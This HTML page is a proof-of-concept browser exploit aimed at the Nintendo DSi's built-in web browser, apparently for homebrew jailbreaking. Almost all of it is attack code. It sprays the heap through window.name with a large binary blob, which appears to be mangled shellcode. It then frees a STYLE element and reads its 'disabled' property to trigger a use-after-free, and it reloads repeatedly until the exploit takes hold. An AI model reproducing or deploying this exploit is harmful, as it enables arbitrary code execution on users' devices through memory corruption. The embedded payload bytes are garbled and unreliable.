
<html>
<head>
<meta http-equiv="refresh">
</head>
<body>

<h3>Nintendo DSi BrowserHax PoC</h3>
<hr>

<blink>Exploit in progress...</blink>
<div id="sandbox"></div>

<script>

var cur_obj;			// Reference to currently tested object
var out_div;			// Top-level sandbox in which cur_obj is created
var cur_tag;			// Name of cur_obj tag

var spray_str;

/* Try to spray the memory with known strings to make fun crashes more visible */
function heap_spray() {

  if (!spray_str) {
    var spray_str = " ã€å8Ÿåî   ãîîšî$Ÿå$ Ÿå 0 ã Qá  
0ä Qáüÿÿ[  úþÿÿêx   D ä ðµ $€'" &
M +ˆ9Ò , Ð+€ ð½+Ñh;`x;C R 4@"C[4 èçÀFD ÷µ $ % 8BNx3€#B Ñ$³j ÔR!¨ÿ÷Êÿ3 j3èT#ƒ@ä$5$4-éÑ!¨ÿ÷»ÿ- $-Ñ, à4$$!¨ÿ÷­ÿ (öÐ,SÐ,Ñ!¨ÿ÷£ÿ% # : : -CÐ™9‘	x;póÑ<$$äC?Íçb ³ÓZ¨ “3 j3]ÿ÷ƒÿ ›$$,Ð,Ð!¨ÿ÷wÿ0à!¨ÿ÷qÿ00  B ³ÓZ “3 j3\¨ÿ÷dÿ › “¼ç!¨ÿ÷Zÿ 0çç ™Q\¼ç8 þ½ÀFD ÷µ #&JJJIKM 8```€€0 PCFLFOÀÄ„BüÑ21ªBéÑBJCI`CJ`CJpCJpCJ€!BJpBJCI€CJCI`"CKRB`BK
ˆBüÑAKBJiF`#AHAJ€Sˆ1€@K ˆ
ˆ®BûÐˆ3€#€Sˆ€ ˆˆ˜BûÐˆ!3€4J ˆ@+ûÑ2N3M3+p1 2Hÿ÷ÿ1K1Ê@VC ) Ñ‚#+pŽ#-J›`À",KÒ`„"!ˆ*K’@
C"€"!ˆBüÑ"ˆ@€#›C#€$J$K`$J`˜Gˆ93€ÖçÀF ¸   ö9 è: è@ ‚ÿÿD H I  G  €èÿÿ „  @  ˆ   (üÿ$üÿ&üÿ€    B @   „ðå 8ÿðÿÿðŸåþÿ$þÿ€ >êOh|ŒÖKè`
œý8)ŠW³uˆ¨ê€QÁð)á‡ÐÊÒxN[£Þþ;F&úhïc…ëß³Nà~Ñßœ2Õ;Qâ§üøÀDõê–F$ƒàô3!ÍÐ±NAv¢èxŽSâû›ðÿÊþ‘ IýòÊL†Y’‰ªü9Xà|l¸R3$´u²°ŽÄÑH¼¤Àu¶´ŽÐÑHÈ¤Ìuº¸ŽÜÑHÔ¤Ørí¾)¼0k5’N!êGï-Ÿ©€ã@?Íx—µÜ1Êú “ÈÀºYÖÂü°9¥®ø{X´¿T§)@ŠAEC"D‘HE¤FRH)Iµ4O3,‚â´ÂáåG1Ãký$×ì Ïû‘ò0>Ó‹å¾.CVˆI8X‚hŽ¿
µølï 3÷L¶PX"ƒ§ëÁçH7£Aå} Ó½R£Â‚J ç¶¯Òá¿o¶
$ Ÿ0ËRöü?Ž¹·ý4ãÛ1¯åàW åõŸþŽCü#unè!"Á"2«Ís#fÔÌXÄò7šñÆ/Š¡ðW×Ãt¬þ>0S¶ùð™[ŸáðœŸÍfgKÖg M«dÞ®g})5íµ 
8»-{r9ä±„Ð‡ž¥o(@ß¨%Š‘-í‘ ž¹\€&.B®ñˆç<Sñí§ç‘‰U’ÂçñqºuèÜÏ:)1úMíJí-qy4TgPCÖÑ¤¤ÔH%	å ä×®¹ê4„C~UÎèÜ£ÇÕoNK6ø¹W.ë›ƒŸCœBéÒrèqÿ8K½å*hÇñ™6kðR;(¢,‘H8¤<u}îÌQû\pjgrãa_sÿ/$Ÿ”'J•7&tf\âÜÿïÆ=øÑÏt 0É4“´ð¿ù3ý»#E%2ó[B«é"“U1qý²€ç©¨WÃ$ÄtFh³”œÎ­•p5!³¡kFçÚÞq|*©01>5Ä£ò$xÜS@[½Ñ7j½˜ÖJàssÍ‚‰Xå:0p"çIôçÿÇ(‚¸J°E´#¨¤E´ÄR¼)ÀE!-Ð¢È‘HÌê
)£Ã6 )JGƒ‚É“ñ]V€üx¬¸#ÛS®ß°<[P½K¨ãò<NžŸ
ÿ
šûÅ˜<?S;›2E(Ž‹9û›l¼šñ½‹cDx“Ùª;!•‘ÍJØ³ä*üÛñXØ+Smþ›Õñéð[‰.:HñïûRK,YlœDÊ7UR‡³¶ö9r‘t±û-•Ð+ñ:btrxú_äàw3EÔ…Ø#ä<ÜÁŽæ\)„<ö àÐJÌEØ"Ü‘HÀ¤Èás»"ÇW]ž§”Àyd)ÑÕˆ¿+ý$V²`:OI<­?ccø<=ðc$ò·ôÄ/[ûýƒ4Iå±Ù¼;Ÿ1pµM"«%q¬a“ÚIJIš`Ò5&–FC?˜AºÛøÓæÑs®Ï@ J³=“BÙoÑÜŠ\àùyNðHL¹MÒy{jçàÜ€IkJÞHÞòØý+büÐzþºüé§HÇäÂýþ,Y`¤¬M÷ŒpöÊ5çÒ ;£—…"ƒ‘½´ÂGtüyìäzÐá$Iõ¯ðˆIp4lœø¦õ+µcOJØß!ÏŽÙúÏwJƒ»h‚£¶XÉ9DÇ34‡áÀó{x)9x§µ’ŒÊ¶Qª9æ+Ñ%*ób|®A.–
ö>´•óÎÿ OOí
{þ¦òñ5UTBòÁ%fõ0æ^ÀÿxÇ]Â<ÙZ	Àø˜rÁ
¬s™ÙHÀ«Ú«ÿ$p¬džÇÏ˜˜BêÙ
ßHèç	ù€ÙhR
›eF›ÿ#}ñK¤ìtY]	 37ØÙìûû$Ç
p9WöZã*xna;³+ØöÏÌW#ðµ7´	É®#x™ÿûÐ2ÞþVuKƒ›âMú}ïÍóçrLo…6<878ÃÐ…R2FŒ
lS£(AòÜÑ–*®N+.T+{¿•6ÿ![râ\ã€*Rþ¬]âÕÌ&Ÿz?ï8¹\7g_"¢æ¸XáJ¥Zã=îá|~¥UöIiÐxfR¾T~÷†™a\aÞâØ KëÝdlPH[Ÿ¬åì£{-_íííhL;Oá9ûgm#˜Õ¶Sai>v bÅ|Ð³!ò	À¶Þó*`@¹Î
šìHÿDJEKÿw"p>%CIžG÷¾!yYçç‹B¦Oác…èÓÙDè
cfÿ‹Òï/
Ñ'3ã\û›žÐ>Õ[ElßËû”$²ùïå} ¡ùc‹ÉÃï:í<0ý13ÐÂ
Žç çc‹À’9h>GÝÛ>VC†éJOõ™72’r²–©¾)-2N¬,²ŽP.Êû1/Mh¹MÜ`§Ðó4(3Ÿ¨#x»Ç#f<½õù­"@šZCUÿ=`çÿÖáÙ<#äH|8‚à(R@?œ,¡Å$:œôÿ
3µQŽIŽj'ûpég¥p,—Ò-Ô¥k.+øÑH?›ÌoÖ>Fº0g6ôJþê­![™fJ.®Xd†b˜+ñ>°‹7»;Ñ,‹LÐ=…PÃÚKÃ·Íahæ‹1:N')™³Øçq&›Œ½	\ÂdKäæ "›!¢¨³ê
þÏ#àz/@Å(cÜu”\šW‹+Æo}ŠÚ¶'ÑO&vzÐª³|Øµ.Œyþ÷›]ÌeF}0.ðýxNŸxsR°6ÃÑ¨¦Ð3‰ÿ-¿ÑOUùJµh›Ø9Ñ¸l9’´ï«ð\}³Uþ?M]›6ÝBXAwÀsxÐnï`b#}Ø3ã¢Å~¶²7þàCdç8¯H4¤0|8&08,wìc…9°
ø©c9íMÐsK™KÑàAÏOÒÅ)áMo,F“Ü9h0þ[Þ¨L™
Ùª5Ê™æñ–ƒö
ñ>½4’Í‘/Ù“>ûÌ?ÍklÛÞCgÈöÍ@_Ú^*
Ó[ïð³µ¸)Ö›žýÒx;ŠgŽ¦PX{ÃW“;jý!JO3Æ–ûš“B2Ñ5©ŽÃ½sðPvýÃ<Í­°1±»˜ì2ÅçgOù£NÜîôg7’$Ã;ht‚Ÿ=BÝ¥(Å›Ný?šo
K nÑi9miðøŸ›ä¯Û¯Ãö³±Æò\íÊÑgÄÇ(%ÇçÞé( ™D%²AÞñíOˆÚ6xƒÔê­Ð¶7I@OŒ"—ÕƒÉYCãÊÏS]ç†ðU‰¸JçÅÐmÜ!µòÓßŸ«‹Nk^iœæð­WÔÿãjÏJúœáØ¥	3CÓDçÙhˆ8º[÷çùÉðµÃË°þÜEy›#€×È@“ÀþkÆB¾Çœw¯”–‹tMz¬/ åìäòî@UüÑÑqL#âòjžMu+joõëÖInK	¿çdCh_”“^´ïéªò©ó-äBZA’_+ú¾•:~©ŠOe­•
®qñ%ÝÝv-NBæ«6–0=,_z\^IŽB(Ù¿ß1ÐÖ–÷<Xª´žÐhÃÁö‘,*XàiÎUL¡æŽódöˆMö1s±BùÑúÒ:B™J1M¼Ìk(K²‚º
©ÉyÙ!BÓ#Ñ™ü) ¼Ÿ-ÐzˆE»&90N~>IíÙN$ô¨¯~ú”;NÉ4`	ÿœŒé£ãa9L¤FÏ˜[s™aËDÓU8N1@ú€Í‘37J;B/Ðþ§‚hsL`sNÍƒ9FÃÝ¶<âfè;€›¾:çÐ\¦.ŒÐ5²š-3@-[)+£4ƒ
dœ*K¸§g\<Ãa
°ðÿ¦
ªƒ’æRÌÕUçg™‹šâˆËBk„¹¬QÕÒ„h]K`:
ÉŠB_«@æ¸.öãÑÀØáHI"Ý
D[@qË0±ýþ©vý;€ƒé²‘H¤R)ŠGVÇc•Gyì	³¶"%ÏHƒ.+K,7œBƒÂ‚.Qbc(L'—@“ä'õª!zŽ&Iœl¬Ú%¡6F,æÏ1”È$Ü¯£oBÕ ¹KÎÜâ#f’”áž1ª*¥‚(KSšJÕ£e:5Û#NOË®Ý5cg.c3c&+~¿²µííH,ÕML%Õˆ´C—¤rKmò¹*Qþt6¼ym­[¢	"tž5zØBIkà… #ä~"O‘ƒêü”þŠE$#äî@a(%H&¤x®pµ[LCâƒ#îð¹ù?³8£Õ"›UÞ“²ô221€ÊÛ@ýæPqX'ÑJOI*CÆ!¦ÛðÕ?Ã*íÚë›åH+Ð½äUªAßqbFŽ"
C¢û*úW@gphAƒºôþ>¦ói"b=Iÿ‚Pö`˜@èÑ¢’	:¤*RÐ&ø%0ï°c¦_§Ò3¦táäÓ)èÀØÎÊAùšvæ©bÊÏ™ÈÁ3#j(¿ïÆÆÃ£»+B»¸î€&¶ñbØIä¼³Ë(c®Ñ;j½Î¦bð2Ç!ó"~àã3$ Þ’ž›¹¿¦ê³™*&}É	ùC2¼t!ìb~™Q“c[
¬?#âß*@£»#c}WºCf›óóîxéP$7vƒ§-iYl“äu	MF%#²G*øµLÏcjñn‰£"<ÑFWÎ›HýÓ"‹†
KóR¨³+®ÉK‰Õ¼rJm¯€ ñ2M.I'qe`ÿ÷Tý h@ÀøþÊtèã-E!I*
HOÙ<šE}3žæM‡­ AH0¤@RP)`&p):…ù?Hâþ1˜‰ûq0„n,©ËöÅå/wwô«•»ŠÆºã”.S™I}Ó¨.	hXîühQºWlþ¹‘@Ãfk
´Xí¼aÀâÿœèÿÒ0GÅ<P/´p?ŸO/t_Roi4šŸOh¯	úÃ°¤rkî/ ¤LØÑ	³›-`ÝgùLå‹´-ÀrÓë ÒêìÛâßð!?õÐ•ÚŽkX¦Fáâ;îåÙ Ó3BÓ. ¹Šâµ&{tXÈ4Mþ;ðÓÍByH\¨Š‹L3sI+¤5íIê=Bð
ZhT¡ßÅÜÿLDII8 «´ópíaÃÕˆÛž:N3"#ÁÀ	d9Áàƒ2ðh \ƒ0ƒƒAíGP“ô DlS-AZÚ„™á»v@ £x‚¡¿˜#2|ÖcH~˜ì| 0Ž1> à†?'øÉÀ¼òl ppCíÀZà¨a9í½Qâ'?è°Iè0®1˜&|šŒá(ëP
Ï²]¼ŒX6YÓÒmØR"uÝƒõŸ¬p³-‚'Y1úžF:s˜ãå¨=¨ê2ëô0FÆ–¡­FíF]fá¡1C ¢€ÿ
ÊS{"°åÌïÇ¼Îs
 <g‘™Ì§Ø.—€{L;>Ú<¦ä#‘Ùº3úŽ)Ôu	!rò"zLR¡% ‚þ\O3ëí`¡Bù0àbFáiP)ìàÃ“ ³2þ'mQã÷ä
Ö–é±f’ë@½Ïè’ãL¿Aà~pŽ«ðµ*9Ù
òCñj­7Ñ ÿ=-	.¯¥6'ågË_—§.Ÿ\çhß`¾34³/BÌ$f5-—Iå@Eõ,Ù¼tÎXîPø3æÛl.ùØ¿<w—4¤v@-×	‹õ7ÐW#Ì\ìT3“Búù»E¼ÿy*óÑþNð\" øç¿ÈW=ùzƒÌ¡þî‚Ÿåß/á7ÁxGÀF{òê€BÐOT.NDS¿¨ÿØ' ó$G¹š‹3 
e¹˜±" )"  Ô  ";
	/* TODO: TWEAK for DSi */
    for (var i=0;i<12;i++) spray_str += spray_str; 
  }

  window.name = Math.random() + spray_str + Math.random();
  eval("window.name=''");

}

//Important for exploit stability, 10-100ms are okay
function sleep() {
  setTimeout(function () {
     return;
  }, 100);
}

/* Log an event. */
function log(message) {

  //console.log(message);
  sleep();
  return;
	
  /*
  var stateTemp = "NaN";
  var request = new XMLHttpRequest();
  request.open("GET", "debug.php?state=" + stateTemp + "&message=" + message, false);
  request.send();
  */
}

/* Main browserhax function */
function dsihax() {

/*********************************************/
/* PHASE 0: Create new HTML tag in a sandbox */
/*********************************************/

	log('+++ Phase 0: initialization +++');

	try { 
		out_div.removeChild(cur_obj); 
		log('Previous object removed OK.');
	} catch (e) {
		log('Failed to remove previously used object.');
	}

	cur_tag = "STYLE";
	log('Picked target tag: <' + cur_tag + '>');

	cur_obj = document.createElement(cur_tag);
	out_div.appendChild(cur_obj);

	cur_obj.innerHTML = 'Hello world'; 
	log('Populated object with sample HTML.');
	cur_obj.value = 'Hello world'; 
	log('Populated object with sample value.');
	  
	log('+++ Phase 1: discarding object +++');

      heap_spray();

          log('Trying to delete child node via DOM...');
          try {
            out_div.removeChild(cur_obj);
            log('...success.');
          } catch (e) {
            log('...received exception (' + e + ')');
          }

      heap_spray();
	  
      if (cur_obj) {
        log('+++ Phase 2: read objects "disabled" property value +++');
		log('+++ This should crash the DSi. Retry when not... +++');

		// read object disabled property, will crash the DSi, because use-after-free?
		// sometimes returns randomly true/false or just crashes
		var checkProp = cur_obj.disabled;
		log('+++ property value is: ' + checkProp + ' +++');
      }

}

  heap_spray();

  out_div  = document.getElementById('sandbox');
  out_div.innerHTML = '';

  //Silent Retry until it works...
  setInterval('try { dsihax() } catch (e) { location.reload(); }',1);

</script>

